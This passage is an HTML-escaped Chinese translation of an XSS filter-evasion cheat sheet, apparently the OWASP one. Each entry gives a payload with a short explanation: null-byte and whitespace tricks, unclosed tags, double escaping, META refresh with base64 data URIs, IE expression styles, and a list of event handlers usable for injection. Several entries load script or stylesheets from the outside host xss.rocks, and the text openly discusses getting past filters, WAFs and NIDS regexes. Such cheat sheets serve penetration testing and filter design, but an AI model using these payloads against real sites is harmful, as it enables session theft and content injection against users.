&lt;h2 id=&quot;使用空字符分隔javascript指令&quot;&gt;使用空字符分隔JavaScript指令&lt;/h2&gt;

&lt;p&gt;空字符同样可以作为XSS攻击向量，但和上面有所区别，你需要使用一些例如Burp工具或在URL字符串里使用%00，亦或你想使用VIM编写自己的注入工具（^V^@会生成空字符），还可以通过程序生成它到一个文本文件。老版本的Opera浏览器（例如Windows版的7.11）还会受另一个字符173（软连字符）的影响。但是空字符%00更加有用并且能帮助绕过真实世界里的过滤器，例如这个例子里的变形：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;perl -e 'print &quot;&amp;lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&amp;gt;&quot;;' &amp;gt; out
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;利用img标签中javascript指令前的空格和元字符&quot;&gt;利用IMG标签中JavaScript指令前的空格和元字符&lt;/h2&gt;

&lt;p&gt;如果过滤器不计算”javascript:”前的空格，这是正确的，因为它们不会被解析，但这点非常有用。因为这会造成错误的假设，就是引号和”javascript:”字样间不能有任何字符。实际情况是你可以插入任何十进制的1至32号字符&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot; &amp;amp;#14;  javascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;利用非字母非数字字符&quot;&gt;利用非字母非数字字符&lt;/h2&gt;

&lt;p&gt;FireFox的HTML解析器认为HTML关键词后不能有非字母非数字字符，并且认为这是一个空白或在HTML标签后的无效符号。但问题是有的XSS过滤器认为它们要查找的标记会被空白字符分隔。例如”&amp;lt;SCRIPT\s” != “&amp;lt;SCRIPT/XSS\s”:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT/XSS SRC=&quot;http://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;基于上面的原理，可以使用模糊测试进行扩展。Gecko渲染引擎允许任何字符包括字母，数字或特殊字符（例如引号，尖括号等）存在于事件名称和等号之间，这会使得更加容易绕过跨站脚本过滤。注意这同样适用于下面看到的重音符:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|\]^`=alert(&quot;XSS&quot;)&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yair Amit让我注意到了IE和Gecko渲染引擎有一点不同行为，在于是否在HTML标签和参数之间允许一个不含空格的斜杠。这会非常有用如果系统不允许空格的时候&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT/SRC=&quot;http://xss.rocks/xss.js&quot;&amp;gt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;额外的尖括号&quot;&gt;额外的尖括号&lt;/h2&gt;

&lt;p&gt;这个XSS攻击向量可以绕过某些检测引擎，比如先查找第一个匹配的尖括号，然后比较里面的标签内容，而不是使用更有效的算法，例如Boyer-Moore算法就是查找整个字符串中的尖括号和相应标签（当然是通过模糊匹配）。双斜杠注释了额外的尖括号来防止出现JavaScript错误&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;);//&amp;lt;&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;未闭合的script标签&quot;&gt;未闭合的script标签&lt;/h2&gt;

&lt;p&gt;在Firefox和Netscape  8.1的Gecko渲染引擎下你不是必须构造类似“&amp;gt;&amp;lt;/SCRIPT&amp;gt;”的跨站脚本攻击向量。Firefox假定闭合HTML标签是安全的并且会为你添加闭合标记。多么体贴！不像不影响Firefox的下一个问题，这不需要在后面有额外的HTML标签。如果需要可以添加引号，但通常是没有必要的，需要注意的是，我并不知道这样注入后HTML会什么样子结束:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=http://xss.rocks/xss.js?&amp;lt; B &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;script标签中的协议解析&quot;&gt;script标签中的协议解析&lt;/h2&gt;

&lt;p&gt;这个特定的变体是由Łukasz  Pilorz提交的并且基于Ozh提供的协议解析绕过。这个跨站脚本示例在IE和Netscape的IE渲染模式下有效，如果添加了&amp;lt;/SCRIPT&amp;gt;标记在Opera中也可以。这在输入空间有限的情况下是非常有用的，你所使用的域名越短越好。”.j”是可用的，在SCRIPT标签中不需要考虑编码类型因为浏览器会自动识别&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;SCRIPT SRC=//xss.rocks/.j&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;只含左尖括号的htmljavascript-xss向量&quot;&gt;只含左尖括号的HTML/JavaScript XSS向量&lt;/h2&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;IE渲染引擎不像Firefox，不会向页面中添加额外数据。但它允许在IMG标签中直接使用javascript。这对构造攻击向量是很有用的，因为不需要闭合尖括号。这使得有任何HTML标签都可以进行跨站脚本攻击向量注入。甚至可以不使用”&amp;gt;”闭合标签。注意：这会让HTML页面变得混乱，具体程度取决于下面的HTML标签。这可以绕过以下NIDS正则:/((\%3D)&lt;/td&gt;
      &lt;td&gt;(=))[^\n]*((\%3C)&lt;/td&gt;
      &lt;td&gt;&amp;lt;)[^\n]+((\%3E)&lt;/td&gt;
      &lt;td&gt;&amp;gt;)/因为不需要”&amp;gt;”闭合。另外在实际对抗XSS过滤器的时候，使用一个半开放的&amp;lt;IFRAME标签替代&amp;lt;IMG标签也是非常有效的&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;javascript:alert('XSS')&quot; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;多个左尖括号&quot;&gt;多个左尖括号&lt;/h2&gt;

&lt;p&gt;使用一个左尖括号替代右尖括号作为标签结尾的攻击向量会在不同浏览器的Gecko渲染引擎下有不同表现。没有左尖括号时，在Firefox中生效，而在Netscape中无效。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;iframe src=http://xss.rocks/scriptlet.html &amp;lt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;javascript双重转义&quot;&gt;JavaScript双重转义&lt;/h2&gt;

&lt;p&gt;当应用将一些用户输入输出到例如：&lt;script&gt;var  a=&quot;$ENV{QUERY_STRING}&quot;;&lt;/script&gt;的JavaScript中时，你想注入你的JavaScript脚本，你可以通过转义转义字符来规避服务器端转义引号。注入后会得到&lt;script&gt;vara=&quot;\\&quot;;alert('XSS');//&quot;;&lt;/script&gt;，这时双引号不会被转义并且可以触发跨站脚本攻击向量。XSS定位器就用了这种方法&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;\&quot;;alert('XSS');//
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;另一种情况是，如果内嵌数据进行了正确的JSON或JavaScript转义，但没有HTML编码，那可以结束原有脚本块并开始你自己的：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;/script&amp;gt;&amp;lt;script&amp;gt;alert('XSS');&amp;lt;/script&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;闭合title标签&quot;&gt;闭合title标签&lt;/h2&gt;

&lt;p&gt;这是一个简单的闭合&lt;TITLE&gt;标签的XSS攻击向量，可以包含恶意的跨站脚本攻击&lt;/TITLE&gt;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;/TITLE&amp;gt;&amp;lt;SCRIPT&amp;gt;alert(&quot;XSS&quot;);&amp;lt;/SCRIPT&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;input-image&quot;&gt;INPUT image&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;INPUT TYPE=&quot;IMAGE&quot; SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;body-image&quot;&gt;BODY image&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY BACKGROUND=&quot;javascript:alert('XSS')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;img-dynsrc&quot;&gt;IMG Dynsrc&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG DYNSRC=&quot;javascript:alert('XSS')&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;img-lowsrc&quot;&gt;IMG lowsrc&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG LOWSRC=&quot;javascript:alert('XSS')&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;list-style-image&quot;&gt;List-style-image&lt;/h2&gt;

&lt;p&gt;处理嵌入的图片列表是很麻烦的问题。由于JavaScript指令的原因只能在IE渲染引擎下有效。不是一个特别有用的跨站脚本攻击向量:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;li {list-style-image: url(&quot;javascript:alert('XSS')&quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;UL&amp;gt;&amp;lt;LI&amp;gt;XSS&amp;lt;/br&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;图片中引用vbscript&quot;&gt;图片中引用VBscript&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC='vbscript:msgbox(&quot;XSS&quot;)'&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;livescript-仅限旧版本netscape&quot;&gt;Livescript (仅限旧版本Netscape)&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG SRC=&quot;livescript:[code]&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;svg对象标签&quot;&gt;SVG对象标签&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;svg/onload=alert('XSS')&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;ecmascript-6&quot;&gt;ECMAScript 6&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;Set.constructor`alert\x28document.domain\x29``` 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;body标签&quot;&gt;BODY标签&lt;/h2&gt;

&lt;p&gt;这个方法不需要使用任何例如”javascript:”或”&amp;lt;SCRIPT…“语句来完成XSS攻击。Dan Crowley特别提醒你可以在等号前加入一个空格(“onload=” != “onload =”):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BODY ONLOAD=alert('XSS')&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;事件处理程序&quot;&gt;事件处理程序&lt;/h2&gt;

&lt;p&gt;在XSS攻击中可使用以下事件&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;

    1.    FSCommand() (攻击者当需要在嵌入的Flash对象中执行时可以使用此事件)

    2.    onAbort() (当用户中止加载图片时)

    3.    onActivate() (当对象激活时)

    4.    onAfterPrint() (用户打印或进行打印预览后触发)

    5.    onAfterUpdate() (从数据源对象更新数据后由数据对象触发)

    6.    onBeforeActivate() (在对象设置为激活元素前触发)

    7.    onBeforeCopy() (攻击者在选中部分拷贝到剪贴板前执行攻击代码-攻击者可以通过执行execCommand(&quot;Copy&quot;)函数触发)

    8.    onBeforeCut() (攻击者在选中部分剪切到剪贴板前执行攻击代码)

    9.    onBeforeDeactivate() (在当前对象的激活元素变化前触发)

    10.  onBeforeEditFocus() (在一个包含可编辑元素的对象进入激活状态时或一个可编辑的对象被选中时触发)

    11.  onBeforePaste() (在用户被诱导进行粘贴前或使用execCommand(&quot;Paste&quot;)函数触发)

    12.  onBeforePrint() (用户需要被诱导进行打印或攻击者可以使用print()或execCommand(&quot;Print&quot;)函数).

    13.  onBeforeUnload() (用户需要被诱导关闭浏览器-除非从父窗口执行，否则攻击者不能关闭当前窗口)

    14.  onBeforeUpdate() (从数据源对象更新数据前由数据对象触发)

    15.  onBegin() (当元素周期开始时由onbegin 事件立即触发)

    16.  onBlur() (另一个窗口弹出当前窗口失去焦点时触发)

    17.  onBounce() (当marquee对象的behavior属性设置为“alternate”且字幕的滚动内容到达窗口一边时触发)

    18.  onCellChange() (当数据提供者的数据变化时触发)

    19.  onChange() (select，text, 或TEXTAREA字段失去焦点并且值发生变化时触发)

    20.  onClick() (表单中点击触发)

    21.  onContextMenu() (用户需要在攻击区域点击右键)

    22.  onControlSelect() (当用户在一个对象上创建控件选中区时触发)

    23.  onCopy() (用户需要复制一些东西或使用execCommand(&quot;Copy&quot;)命令时触发)

    24.  onCut() (用户需要剪切一些东西或使用execCommand(&quot;Cut&quot;)命令时触发)

    25.  onDataAvailable() (用户需要修改元素中的数据，或者由攻击者提供的类似功能)

    26.  onDataSetChanged() (当数据源对象变更导致数据集发生变更时触发)

    27.  onDataSetComplete() (数据源对象中所有数据可用时触发)

    28.  onDblClick() (用户双击一个表单元素或链接)

    29.  onDeactivate() (在激活元素从当前对象转换到父文档中的另一个对象时触发)

    30.  onDrag() (在元素正在拖动时触发)

    31.  onDragEnd() (当用户完成元素的拖动时触发)

    32.  onDragLeave() (用户在拖动元素离开放置目标时触发)

    33.  onDragEnter() (用户将对象拖拽到合法拖曳目标)

    34.  onDragOver() (用户将对象拖拽划过合法拖曳目标)

    35.  onDragDrop() (用户将一个对象（例如文件）拖拽到浏览器窗口)

    36.  onDragStart() (当用户开始拖动元素时触发)

    37.  onDrop() (当拖动元素放置在目标区域时触发)

    38.  onEnded() (在视频/音频（audio/video）播放结束时触发)

    39.  onError() (在加载文档或图像时发生错误)

    40.  onErrorUpdate() (当从数据源对象更新相关数据遇到错误时在数据绑定对象上触发)

    41.  onFilterChange() (当滤镜完成状态变更时触发)

    42.  onFinish() (当marquee完成滚动时攻击者可以执行攻击)

    43.  onFocus() (当窗口获得焦点时攻击者可以执行攻击代码)

    44.  onFocusIn() (当元素将要被设置为焦点之前触发)

    45.  onFocusOut() (攻击者可以在窗口失去焦点时触发攻击代码)

    46.  onHashChange() (当锚部分发生变化时触发攻击代码)

    47.  onHelp() (攻击者可以在用户在当前窗体激活时按下F1触发攻击代码)

    48.  onInput() (在 &amp;lt;input&amp;gt; 或 &amp;lt;textarea&amp;gt; 元素的值发生改变时触发)

    49.  onKeyDown() (用户按下一个键的时候触发)

    50.  onKeyPress() (在键盘按键被按下并释放一个键时触发)

    51.  onKeyUp() (用户释放一个键时触发)

    52.  onLayoutComplete() (用户进行完打印或打印预览时触发)

    53.  onLoad() (攻击者在窗口加载后触发攻击代码)

    54.  onLoseCapture() (可以由releaseCapture()方法触发)

    55.  onMediaComplete() (当一个流媒体文件使用时，这个事件可以在文件播放前触发)

    56.  onMediaError() (当用户在浏览器中打开一个包含媒体文件的页面，出现问题时触发事件)

    57.  onMessage() (当页面收到一个信息时触发事件)

    58.  onMouseDown() (攻击者需要让用户点击一个图片触发事件)

    59.  onMouseEnter() (光标移动到一个对象或区域时触发)

    60.  onMouseLeave() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)

    61.  onMouseMove() (攻击者需要让用户将光标移到一个图片或表格)

    62.  onMouseOut() (攻击者需要让用户光标移动到一个图像或表格然后移开来触发事件)

    63.  onMouseOver() (光标移动到一个对象或区域)

    64.  onMouseUp() (攻击者需要让用户点击一个图片)

    65.  onMouseWheel() (攻击者需要让用户使用他们的鼠标滚轮)

    66.  onMove() (用户或攻击者移动页面时触发)

    67.  onMoveEnd() (用户或攻击者移动页面结束时触发)

    68.  onMoveStart() (用户或攻击者开始移动页面时触发)

    69.  onOffline() (当浏览器从在线模式切换到离线模式时触发)

    70.  onOnline() (当浏览器从离线模式切换到在线模式时触发)

    71.  onOutOfSync() (当元素与当前时间线失去同步时触发)

    72.  onPaste() (用户进行粘贴时或攻击者可以使用execCommand(&quot;Paste&quot;)函数时触发)

    73.  onPause() (在视频或音频暂停时触发)

    74.  onPopState() (在窗口的浏览历史（history 对象）发生改变时触发)

    75.  onProgress() (攻击者可以在一个FLASH加载时触发事件)

    76.  onPropertyChange() (用户或攻击者需要改变元素属性时触发)

    77.  onReadyStateChange() (每次 readyState 属性变化时被自动调用)

    78.  onRedo() (用户返回上一页面时触发)

    79.  onRepeat() (事件在播放完重复播放时触发)

    80.  onReset() (用户或攻击者重置表单时触发)

    81.  onResize() (用户改变窗口大小时，攻击者可以自动以这种方法触发:&amp;lt;SCRIPT&amp;gt;self.resizeTo(500,400);&amp;lt;/SCRIPT&amp;gt;)

    82.  onResizeEnd() (用户完成改变窗体大小时触发)

    83.  onResizeStart() (用户开始改变窗体大小时触发)

    84.  onResume() (当元素继续播放时触发)

    85.  onReverse() (当元素回放时触发)

    86.  onRowsEnter() (用户或攻击者需要改变数据源中的一行)

    87.  onRowExit() (用户或攻击者改变数据源中的一行后退出时触发)

    88.  onRowDelete() (用户或攻击者需要删除数据源中的一行)

    89.  onRowInserted() (user or attacker would needto insert a row in a data source)

    90.  onScroll() (用户需要滚动或攻击者使用scrollBy()函数)

    91.  onSeek() (当用户在元素上执行查找操作时触发)

    92.  onSelect() (用户需要选择一些文本-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)

    93.  onSelectionChange() (当用户选择文本变化时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)

    94.  onSelectStart() (当用户开始选择文本时触发-攻击者可以以此方式触发: window.document.execCommand(&quot;SelectAll&quot;);)

    95.  onStart() (在marquee 对象开始循环时触发)

    96.  onStop() (当用户按下停止按钮或离开页面时触发)

    97.  onStorage() (当Web Storage更新时触发)

    98.  onSyncRestored() (当元素与它的时间线恢复同步时触发)

    99.  onSubmit() (需要用户或攻击者提交表单)

    100.onTimeError() (用户或攻击者设置时间属性出现错误时触发)

    101.onTrackChange() (用户或攻击者改变播放列表内歌曲时触发)

    102.onUndo() (用户返回上一浏览记录页面时触发)

    103.onUnload() (用户点击任意链接或按下后退按钮或攻击者强制进行点击时触发)

    104.onURLFlip() (当一个高级流媒体格式（ASF）文件，由一个HTML+TIME（基于时间交互的多媒体扩展）媒体标签播放时，可触发在ASF文件中内嵌的攻击脚本)

    105.seekSegmentTime() (这是一个方法可以定位元素某个时间段内中的特定的点，并可以从该点播放。这个段落包含了一个重复的时间线，并包括使用AUTOREVERSE属性进行反向播放。)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;bgsound&quot;&gt;BGSOUND&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BGSOUND SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;-javascript包含&quot;&gt;&amp;amp; JavaScript包含&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;BR SIZE=&quot;&amp;amp;{alert('XSS')}&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;样式表&quot;&gt;样式表&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;javascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;远程样式表&quot;&gt;远程样式表&lt;/h2&gt;

&lt;p&gt;利用像远程样式表一样简单的形式，你可以将XSS攻击代码包含在可使用内置表达式进行重定义的样式参数里。)这只在IE和使用IE渲染模式Netscape8.1+。注意这里没有任何元素在页面中表明这页面包含了JavaScript。提示：这些远程样式表都使用了body标签,所以必须在页面中有除了攻击向量以外的内容存在时才会生效, 也就是如果是空白页的话你必须在页面添加一个字母来让攻击代码生效:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;LINK REL=&quot;stylesheet&quot; HREF=&quot;http://xss.rocks/xss.css&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;远程样式表2&quot;&gt;远程样式表2&lt;/h2&gt;

&lt;p&gt;这个和上面一样有效，不过使用了&lt;style&gt;标签替代&lt;link /&gt;标签.  这个细微的变化曾经用来攻击谷歌桌面。另一方面，如果在攻击向量后有HTML标签闭合攻击向量，你可以移除末尾的&lt;/style&gt;标签。在进行跨站脚本攻击时，如不能同时使用等号或斜杠，这是非常有用的，这种情况在现实世界里不止一次发生了:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;@import'http://xss.rocks/xss.css';&amp;lt;/STYLE&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;远程样式表3&quot;&gt;远程样式表3&lt;/h2&gt;

&lt;p&gt;这种方式仅在Opera 8.0(9.x不可以)中有效，但方法比较有创意.  根据RFC2616，设置一个Link头部不是HTTP1.1规范的一部分,但一些浏览器仍然允许这样做 (例如Firefox和  Opera).  这里的技巧是设置一个头部（和普通头部并没有什么区别，只是设置Link: &lt;a href=&quot;http://xss.rocks/xss.css&quot;&gt;http://xss.rocks/xss.css&lt;/a&gt;; REL=stylesheet）并且在远程样式表中包含使用了JavaScript的跨站脚本攻击向量，这一点是FireFox不支持的:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;Link&quot; Content=&quot;&amp;lt;http://xss.rocks/xss.css&amp;gt;; REL=stylesheet&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;远程样式表4&quot;&gt;远程样式表4&lt;/h2&gt;

&lt;p&gt;这仅能在Gecko渲染引擎下有效并且需要在父页面绑定一个XML文件。具有讽刺意味的是 Netscape认为Gecko更安全 ，所以对绝大多数网站来说会受到漏洞影响:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;BODY{-moz-binding:url(&quot;http://xss.rocks/xssmoz.xml#xss&quot;)}&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含有分隔javascript的style标签&quot;&gt;含有分隔JavaScript的STYLE标签&lt;/h2&gt;

&lt;p&gt;这个XSS会在IE中造成无限循环:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;@im\port'\ja\vasc\ript:alert(&quot;XSS&quot;)';&amp;lt;/STYLE&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;style属性中使用注释分隔表达式&quot;&gt;STYLE属性中使用注释分隔表达式&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IMG STYLE=&quot;xss:expr/*XSS*/ession(alert('XSS'))&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含表达式的img-style&quot;&gt;含表达式的IMG STYLE&lt;/h2&gt;

&lt;p&gt;这是一个将上面XSS攻击向量混合的方法，但确实展示了STYLE标签可以用相当复杂的方式分隔，和上面一样，也会让IE进入死循环:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;exp/*&amp;lt;A STYLE='no\xss:noxss(&quot;*//*&quot;);

xss:ex/*XSS*//*/*/pression(alert(&quot;XSS&quot;))'&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;style标签仅旧版本netscape可用&quot;&gt;STYLE标签（仅旧版本Netscape可用）&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE TYPE=&quot;text/javascript&quot;&amp;gt;alert('XSS');&amp;lt;/STYLE&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用背景图像的style标签&quot;&gt;使用背景图像的STYLE标签&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE&amp;gt;.XSS{background-image:url(&quot;javascript:alert('XSS')&quot;);}&amp;lt;/STYLE&amp;gt;&amp;lt;A CLASS=XSS&amp;gt;&amp;lt;/A&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用背景的style标签&quot;&gt;使用背景的STYLE标签&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;STYLE type=&quot;text/css&quot;&amp;gt;BODY{background:url(&quot;javascript:alert('XSS')&quot;)}&amp;lt;/STYLE&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含style属性的html任意标签&quot;&gt;含STYLE属性的HTML任意标签&lt;/h2&gt;

&lt;p&gt;IE6.0和IE渲染引擎模式下的Netscape 8.1+并不关心你建立的HTML标签是否存在，只要是由尖括号和字母开始的即可:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;本地htc文件&quot;&gt;本地htc文件&lt;/h2&gt;

&lt;p&gt;这和上面两个跨站脚本攻击向量有些不同，因为它使用了一个必须和XSS攻击向量在相同服务器上的.htc文件。这个示例文件通过下载JavaScript并将其作为style属性的一部分运行来进行攻击&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;XSS STYLE=&quot;behavior: url(xss.htc);&quot;&amp;gt;     
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;us-ascii编码&quot;&gt;US-ASCII编码&lt;/h2&gt;

&lt;p&gt;US-ASCII编码（由Kurt  Huwig发现）。它使用了畸形的7位ASCII编码来代替8位。这个XSS攻击向量可以绕过大多数内容过滤器，但是只在主机使用US-ASCII编码传输数据时有效，或者可以自己设置编码格式。相对绕过服务器端过滤，这在绕过WAF跨站脚本过滤时候更有效。Apache Tomcat是目前唯一已知使用US-ASCII编码传输的：&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;¼script¾alert(¢XSS¢)¼/script¾ 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;meta&quot;&gt;META&lt;/h2&gt;

&lt;p&gt;关于meta刷新比较奇怪的是它并不会在头部中发送一个referrer-所以它通常用于不需要referrer的时候:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=javascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;使用数据的meta&quot;&gt;&lt;strong&gt;使用数据的META&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;URL  scheme指令。这个非常有用因为它并不包含任何可见的SCRIPT单词或JavaScript指令,因为它使用了base64编码.请查看RFC  2397寻找更多细节。你同样可以使用具有Base64编码功能的XSS工具来编码HTML或JavaScript:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0;url=data:text/html 
base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K&quot;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;含有额外url参数的meta&quot;&gt;&lt;strong&gt;含有额外URL参数的META&lt;/strong&gt;&lt;/h2&gt;

&lt;p&gt;如果目标站点尝试检查URL是否包含”http://”，你可以用以下技术规避它(由Moritz Naumann提交):&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;META HTTP-EQUIV=&quot;refresh&quot; CONTENT=&quot;0; URL=http://;URL=javascript:alert('XSS');&quot;&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&quot;iframe&quot;&gt;IFRAME&lt;/h2&gt;

&lt;p&gt;如果允许Iframe那就会有很多XSS问题:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-php+HTML&quot;&gt;&amp;lt;IFRAME SRC=&quot;javascript:alert('XSS');&quot;&amp;gt;&amp;lt;/IFRAME&amp;gt;  
&lt;/code&gt;&lt;/pre&gt;

